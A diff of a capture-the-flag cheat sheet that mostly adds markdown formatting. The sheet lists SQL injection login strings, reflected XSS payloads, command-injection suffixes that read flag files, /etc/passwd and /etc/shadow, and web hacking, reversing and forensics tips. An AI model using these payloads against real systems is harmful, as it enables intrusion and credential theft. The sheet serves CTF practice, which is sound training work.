@@ -2,7 +2,7 @@
 Hidden pages
 * Run `Dirbuster`, `dirb`, or `gobuster` to get a directory tree and insecure files
 * Inspect robots.txt : www.website.com/robots.txt
-* Inspect website headers: curl -I website.com/page.php
+* Inspect website headers: `curl -I website.com/page.php`
 
 Hidden details - Use "Find" in page source to search: Login, Password, Admin, Administrator, Success
 Passwords - Always try password=username first, then shorter/obvious password lists, before running rockyou.txt
@@ -11,15 +11,15 @@ Passwords - Always try password=username first, then shorter/obvious password li
 * Create user --> BurpSuite Interceptor ON --> Update Password --> Burp Repeater request to change "admin" password 
 
 ## SQL Inj 
-Attempt login with: admin' OR 1=1, ' OR 1=1-- -, " OR 1=1-- -, " OR 1 or ", admin"-- -", admin;-- -'
+Attempt login with: `admin' OR 1=1`, `' OR 1=1-- -`, `" OR 1=1-- -`, `" OR 1 or "`, `admin"-- -"`, `admin;-- -'`
 
 ## Reflected XSS 
 Put any of the following into address bars, comment fields or any Java fields: <script>alert(flag)</script>, <sScriptCRIPT>alert(flag)</sSCRIPTcript>, 
 
 ## OS Inj
-Run [valid input] followed by: || cat ../flag.txt, | cat ../flag.txt, && cat ../flag.txt, & cat ../flag.txt, ; cat ../flag.txt
-Run [valid input] followed by: || cat ../../etc/passwd, | cat ../etc/shadow, && cat ../etc/shadow, & cat ../etc/shadow, ; cat ../etc/shadow
-Run [valid input] followed by: || ifconfig, | ifconfig, && ifconfig, & ifconfig, ; ifconfig
+Run [valid input] followed by: `|| cat ../flag.txt`, `| cat ../flag.txt`, `&& cat ../flag.txt`, `& cat ../flag.txt`, `; cat ../flag.txt`
+Run [valid input] followed by: `|| cat ../../etc/passwd`, `| cat ../etc/shadow`, `&& cat ../etc/shadow`, `& cat ../etc/shadow`, `; cat ../etc/shadow`
+Run [valid input] followed by: `|| ifconfig`, `| ifconfig`, `&& ifconfig`, `& ifconfig`, `; ifconfig`
 
 Input following into address bar with "?" options: `?message=;system` , `?page='netstat`
 Other options for breaks: ' " : 
@@ -51,13 +51,13 @@ Windows Post-exploitation: dir, type, find, net users
 _______________________________________________________
 
 # Reversing
-* Run "Strings <file> | grep flag" 
+* Run `Strings <file> | grep flag`
 * [Excellent Reversing Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Reversing-HW-Misc/)
 
 # Forensics
 * [Excellent Forensics Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/)  
-* Wireshark Filter: http contains flag, tcp contains flag
-  * Right-click packet and select "Follow stream"
+* Wireshark Filter: `http contains flag`, `tcp contains flag`
+  * Right-click packet and select `Follow stream`
 * [Chainsaw - Windows Forensics Tool - GitHub](https://github.com/WithSecureLabs/chainsaw)  
 
-*ps1 = Powershell
+* ps1 = Powershell
